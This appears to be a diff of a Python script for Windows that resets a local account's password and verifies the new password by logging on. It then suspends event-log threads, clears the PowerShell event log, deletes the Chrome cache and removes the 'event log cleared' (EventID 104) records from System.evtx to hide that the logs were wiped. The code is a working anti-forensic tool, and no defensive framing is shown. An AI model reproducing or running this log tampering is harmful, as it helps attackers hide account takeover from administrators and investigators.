@@ -4,7 +4,6 @@ from win32com import adsi
 from win32security import LogonUser
 from win32con import LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT
 
-
 def set_password(username, password):
     ads_obj = adsi.ADsGetObject("WinNT://localhost/%s,user" % username)
     ads_obj.Getinfo()
@@ -12,23 +11,13 @@ def set_password(username, password):
 
 def verify_success(username, password):
     try:
-        LogonUser(
-            username,
-            None,
-            password,
-            LOGON32_LOGON_INTERACTIVE,
-            LOGON32_PROVIDER_DEFAULT,
-        )
+        LogonUser(username, None, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,)
     except:
         return False
     return True
 
 # Pause Windows Event Logging
 cmd = "C:\Tools\Eventlogedit-evtx\SuspendorResumeTid.exe suspend"
-subprocess.call(cmd)
-
-# Delete Windows Event Logging - PowerShell Logs
-cmd = 'wevtutil.exe cl "Windows PowerShell"'
 subprocess.call(cmd)
 
 # Set random password
@@ -48,7 +37,11 @@ if verify_success(u, p):
     # Clean up Chrome cache
     exec(open("delete_chrome_cache.py").read())
 
-# Delete Windows Event Logging - Event has been cleared logs
+    # Delete Windows Event Logging - PowerShell Logs
+    cmd = 'wevtutil.exe cl "Windows PowerShell"'
+    subprocess.call(cmd)
+
+    # Delete Windows Event Logging - Event has been cleared logs
     cmd = 'wevtutil qe System "/q:*[System [(EventID=104)]]" /rd:true /c:10'
     output = subprocess.check_output(cmd)
 
@@ -57,9 +50,7 @@ if verify_success(u, p):
 
     for repElem in repElemList:
         temp = re.findall(r'\d+', str(repElem))
-        res = ''.join(temp)
-        #print(res)
-
+        res = ''.join(temp) 
         cmd = 'C:\Tools\Eventlogedit-evtx\DeleteRecord-EvtExportLog.exe System.evtx ' + res
         subprocess.call(cmd)
         cmd = 'C:\Tools\Eventlogedit-evtx\DeleteRecordbyGetHandleEx.exe System.evtx 1 temp.evtx'
